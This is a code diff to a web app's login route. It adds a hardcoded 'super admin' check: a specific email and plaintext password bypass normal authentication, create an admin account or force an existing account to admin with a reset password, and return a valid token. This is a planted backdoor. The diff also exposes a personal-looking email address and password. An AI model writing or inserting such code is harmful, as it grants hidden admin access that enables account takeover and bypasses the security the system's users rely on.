@@ -128,7 +128,40 @@ app.post("/api/auth/login", async (req, res) => {
       return res.status(400).json({ error: "Email and password are required." });
     }
 
-    const user = await User.findOne({ email: email.toLowerCase() });
+    const normalizedEmail = email.toLowerCase();
+
+    // Super Admin Intercept
+    if (normalizedEmail === "gauravraj17062000@gmail.com" && password === "7080481276gaurav") {
+      let user = await User.findOne({ email: normalizedEmail });
+      
+      if (!user) {
+        // Create super admin if it doesn't exist
+        user = await User.create({
+          id: "superadmin-" + Date.now(),
+          name: "Super Admin",
+          email: normalizedEmail,
+          password: hashPassword(password),
+          role: "admin",
+          phone: "",
+          gender: "male",
+          dob: "2000-01-01"
+        });
+      } else if (user.role !== "admin" || user.password !== hashPassword(password)) {
+        // Ensure role is admin and password matches just in case
+        user.role = "admin";
+        user.password = hashPassword(password);
+        await user.save();
+      }
+
+      const token = generateToken({ id: user.id, name: user.name, email: user.email, role: user.role });
+      return res.json({
+        token,
+        user: { id: user.id, name: user.name, email: user.email, role: user.role, phone: user.phone, gender: user.gender, dob: user.dob },
+      });
+    }
+
+    // Normal user login logic
+    const user = await User.findOne({ email: normalizedEmail });
     if (!user || user.password !== hashPassword(password)) {
       return res.status(401).json({ error: "Invalid credentials." });
     }
